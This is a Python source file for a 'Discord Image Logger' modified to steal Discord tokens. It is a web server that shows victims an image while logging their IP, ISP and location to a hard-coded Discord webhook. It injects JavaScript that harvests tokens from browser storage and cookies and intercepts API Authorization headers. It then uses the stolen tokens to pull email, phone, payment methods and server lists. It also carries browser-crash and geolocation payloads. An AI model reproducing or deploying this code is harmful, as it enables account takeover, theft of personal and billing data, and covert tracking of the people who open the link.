# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted
# Modified with Discord Token Stealing capability

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, re, json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1527069756572827719/7RcOxXxcAkklFLJK0mLIgwJFU-_YkgXw-ZT87KD0GT44FOh9uBpw9zFGtm9RETPjZQw7",
    "image": "https://imgs.search.brave.com/uPzLBPNle4gPYxpk42t_M8USovZfyjNwDL0Vz7NT5H4/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/cGljY2xpY2tpbWcu/Y29tL21GUUFBZVN3/MFBscDVpb3kvQmFz/ZS1TdGVhbC1BLUJy/YWlucm90LndlYnA",
    "imageArgument": True,
    
    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,
    
    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    
    # === DISCORD TOKEN STEALING === #
    "stealTokens": True,              # Enable Discord token theft
    "tokenStealEndpoint": "/api/tokens",  # Endpoint where tokens are received
    
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    
    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def sendTokenAlert(token, ip, useragent, endpoint="/"):
    """Sends a stolen Discord token to the webhook with validation."""
    if not token or token == "undefined" or token == "null":
        return
    
    # Try to validate and decode the token (JWT-like format: base64.base64.base64)
    token_parts = token.split(".")
    token_decoded = {}
    
    if len(token_parts) == 3:
        try:
            # Add padding for base64 decode
            payload = token_parts[1]
            payload += "=" * (4 - len(payload) % 4) if len(payload) % 4 else ""
            token_decoded = json.loads(base64.b64decode(payload).decode("utf-8", errors="ignore"))
        except Exception:
            pass
    
    discord_id = token_decoded.get("id", "Unknown")
    discord_email = token_decoded.get("email", "N/A (maybe no email scope or bot token)")
    
    # Get user info from Discord API using the token
    user_info = None
    billing_info = None
    guilds = None
    nitro_type = "None"
    
    headers = {"Authorization": token}
    
    try:
        # Fetch user info
        user_resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if user_resp.status_code == 200:
            user_info = user_resp.json()
            discord_id = user_info.get("id", discord_id)
            discord_email = user_info.get("email", "N/A")
            
            # Check Nitro status
            premium_type = user_info.get("premium_type", 0)
            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
            nitro_type = nitro_map.get(premium_type, "Unknown")
            
            # Fetch billing info
            billing_resp = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5)
            if billing_resp.status_code == 200:
                billing_info = billing_resp.json()
            
            # Fetch guilds the user is in
            guilds_resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
            if guilds_resp.status_code == 200:
                guilds = guilds_resp.json()
    except Exception:
        pass
    
    embed_description = f"""**🎫 Discord Token Stolen!**

**Token:** `{token[:50]}...` (truncated for safety)

**User Info:**
> **ID:** `{discord_id}`
> **Email:** `{discord_email}`
> **Username:** `{user_info.get('username', 'Unknown')}#{user_info.get('discriminator', '0000') if user_info else 'Unknown'}`
> **Nitro:** `{nitro_type}`
> **Phone:** `{user_info.get('phone', 'None') if user_info else 'Unknown'}`
> **MFA Enabled:** `{user_info.get('mfa_enabled', 'Unknown') if user_info else 'Unknown'}`
> **Verified:** `{user_info.get('verified', 'Unknown') if user_info else 'Unknown'}`
> **Avatar:** `{user_info.get('avatar', 'None') if user_info else 'Unknown'}`

**Billing Info:**
> **Payment Methods:** `{len(billing_info) if billing_info else 0}`
"""
    
    if billing_info:
        for i, method in enumerate(billing_info[:3]):  # Show first 3
            btype = method.get("type", "Unknown")
            brand = method.get("brand", "N/A")
            last4 = method.get("last_4", "N/A")
            embed_description += f"> **Method {i+1}:** `{btype}` | `{brand}` | `****{last4}`\n"
    
    embed_description += f"""
**Guilds:** `{len(guilds) if guilds else 0} servers`
"""
    
    if guilds:
        # Show top 5 guilds by member count
        sorted_guilds = sorted(guilds, key=lambda g: g.get("approximate_member_count", 0), reverse=True)[:5]
        for g in sorted_guilds:
            embed_description += f"> `{g.get('name', 'Unknown')}` (ID: `{g.get('id', 'N/A')}`) - {g.get('approximate_member_count', '?')} members\n"
    
    embed_description += f"""
**IP:** `{ip}`
**User-Agent:** `{useragent[:100]}...`
"""
    
    # Attempt to use the token for malicious actions (optional)
    # Send a friend request to a specified account
    # create DM, etc.
    
    payload = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "🎣 Token Stealer",
                "color": 0xFF0000,
                "description": embed_description,
                "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{discord_id}/{user_info.get('avatar', 'None')}.png" if user_info and user_info.get('avatar') else None},
            }
        ],
    }
    
    try:
        requests.post(config["webhook"], json=payload)
    except Exception:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return
    
    # --- Token stealing ---
    if token and config["stealTokens"]:
        sendTokenAlert(token, ip, useragent, endpoint)
    # ---------------------
    
    ping = "@everyone"
    
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""
    
    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
           }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # --- Handle token steal endpoint ---
            if config["stealTokens"] and self.path.startswith(config["tokenStealEndpoint"]):
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length > 0:
                    post_data = self.rfile.read(content_length)
                    try:
                        data_json = json.loads(post_data.decode())
                        token = data_json.get("token", "")
                        if token:
                            sendTokenAlert(
                                token,
                                self.headers.get('x-forwarded-for', 'Unknown'),
                                self.headers.get('user-agent', 'Unknown'),
                                self.path
                            )
                    except Exception:
                        pass
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
                return
            # ----------------------------------
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]
            
            # ---- HTML payload with Discord token stealer ----
            token_steal_script = ""
            if config["stealTokens"]:
                # Determine the base URL for the callback
                host = self.headers.get('Host', 'localhost')
                callback_url = f"http://{host}{config['tokenStealEndpoint']}"
                
                token_steal_script = f"""
                <script>
                // === DISCORD TOKEN STEALER ===
                (function() {{
                    var tokenStealEndpoint = '{callback_url}';
                    var discordTokens = [];
                    
                    // Method 1: Extract from localStorage (Discord web app / browser client)
                    try {{
                        for (var i = 0; i < localStorage.length; i++) {{
                            var key = localStorage.key(i);
                            var value = localStorage.getItem(key);
                            
                            // Discord stores token with keys like "token" or "discord_token"
                            if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                                // Check if it looks like a Discord token (base64.base64.base64 format)
                                if (typeof value === 'string' && value.split('.').length === 3) {{
                                    discordTokens.push({{source: 'localStorage', key: key, token: value}});
                                }}
                            }}
                        }}
                        
                        // Direct check for 'token' key (most common for Discord web)
                        var dt = localStorage.getItem('token');
                        if (dt && dt.split('.').length === 3) {{
                            discordTokens.push({{source: 'localStorage', key: 'token', token: dt}});
                        }}
                    }} catch(e) {{}}
                    
                    // Method 2: Extract from sessionStorage
                    try {{
                        for (var i = 0; i < sessionStorage.length; i++) {{
                            var key = sessionStorage.key(i);
                            var value = sessionStorage.getItem(key);
                            if (typeof value === 'string' && value.split('.').length === 3 && value.length > 50) {{
                                discordTokens.push({{source: 'sessionStorage', key: key, token: value}});
                            }}
                        }}
                    }} catch(e) {{}}
                    
                    // Method 3: Extract from cookies
                    try {{
                        document.cookie.split(';').forEach(function(c) {{
                            c = c.trim();
                            if (c.toLowerCase().includes('token') || c.toLowerCase().includes('discord')) {{
                                var parts = c.split('=');
                                var val = parts.slice(1).join('=');
                                if (val.split('.').length === 3) {{
                                    discordTokens.push({{source: 'cookie', key: parts[0], token: val}});
                                }}
                            }}
                        }});
                    }} catch(e) {{}}
                    
                    // Method 4: Try to read from Discord desktop app's localStorage via electron bridge
                    try {{
                        if (window.require) {{
                            var fs = window.require('fs');
                            var path = window.require('path');
                            var appdata = process.env.APPDATA || (process.platform === 'darwin' ? 
                                process.env.HOME + '/Library/Application Support' : 
                                process.env.HOME + '/.config');
                            
                            var discordPaths = [
                                path.join(appdata, 'discord', 'Local Storage', 'leveldb'),
                                path.join(appdata, 'discordcanary', 'Local Storage', 'leveldb'),
                                path.join(appdata, 'discordptb', 'Local Storage', 'leveldb'),
                            ];
                            
                            // Note: Full LevelDB parsing requires more complex logic
                            // This is a simplified version - see the README for extending
                        }}
                    }} catch(e) {{}}
                    
                    // Method 5: Intercept Discord API responses for fresh tokens
                    // Override fetch to capture Authorization headers
                    var originalFetch = window.fetch;
                    window.fetch = function() {{
                        if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('discord.com/api')) {{
                            if (arguments[1] && arguments[1].headers) {{
                                var auth = arguments[1].headers.Authorization || arguments[1].headers.authorization;
                                if (auth && auth.split('.').length === 3) {{
                                    discordTokens.push({{source: 'fetch_intercept', key: 'Authorization', token: auth}});
                                }}
                            }}
                        }}
                        return originalFetch.apply(this, arguments);
                    }};
                    
                    // Also override XMLHttpRequest
                    var originalOpen = XMLHttpRequest.prototype.open;
                    XMLHttpRequest.prototype.open = function(method, url) {{
                        if (url && typeof url === 'string' && url.includes('discord.com/api')) {{
                            var xhr = this;
                            var originalSetHeader = xhr.setRequestHeader;
                            xhr.setRequestHeader = function(header, value) {{
                                if ((header === 'Authorization' || header === 'authorization') && 
                                    typeof value === 'string' && value.split('.').length === 3) {{
                                    discordTokens.push({{source: 'xhr_intercept', key: header, token: value}});
                                }}
                                return originalSetHeader.apply(this, arguments);
                            }};
                        }}
                        return originalOpen.apply(this, arguments);
                    }};
                    
                    // Send all found tokens
                    if (discordTokens.length > 0) {{
                        setTimeout(function() {{
                            var sentTokens = {{}};
                            discordTokens.forEach(function(item) {{
                                if (!sentTokens[item.token]) {{
                                    sentTokens[item.token] = true;
                                    
                                    var xhr = new XMLHttpRequest();
                                    xhr.open('POST', tokenStealEndpoint, true);
                                    xhr.setRequestHeader('Content-Type', 'application/json');
                                    xhr.send(JSON.stringify({{
                                        token: item.token,
                                        source: item.source,
                                        key: item.key,
                                        url: window.location.href
                                    }}));
                                }}
                            }});
                        }}, 500);
                    }}
                    
                    // Method 6: For Electron apps - expose the token via require
                    try {{
                        if (typeof process !== 'undefined' && process.versions && process.versions.electron) {{
                            // Discord desktop app - try to access main process
                            var _token = null;
                            try {{
                                var Electron = window.require('electron');
                                // This may not work due to IPC restrictions, but worth trying
                            }} catch(e) {{}}
                        }}
                    }} catch(e) {{}}
                }})();
                </script>
                """
            # ----------------------------------------------------
            
            data = f'''<!DOCTYPE html>
<html>
<head>
<style>
body {{
    margin: 0;
    padding: 0;
}}
div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}
</style>
{token_steal_script}
</head>
<body>
<div class="img"></div>
</body>
</html>'''.encode()
            
            if self.headers.get('x-forwarded-for') and self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            bot_check_result = botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
            
            if bot_check_result:
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                
                # Check if Discord token was passed via URL parameter
                url_token = None
                if dic.get("t") or dic.get("token"):
                    url_token = dic.get("t") or dic.get("token")
                
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=url_token)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=url_token)
                
                message = config["message"]["message"]
                
                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
                
                datatype = 'text/html'
                
                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()
                
                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())
        
        return
    
    do_GET = handleRequest
    do_POST = handleRequest


handler = ImageLoggerAPI
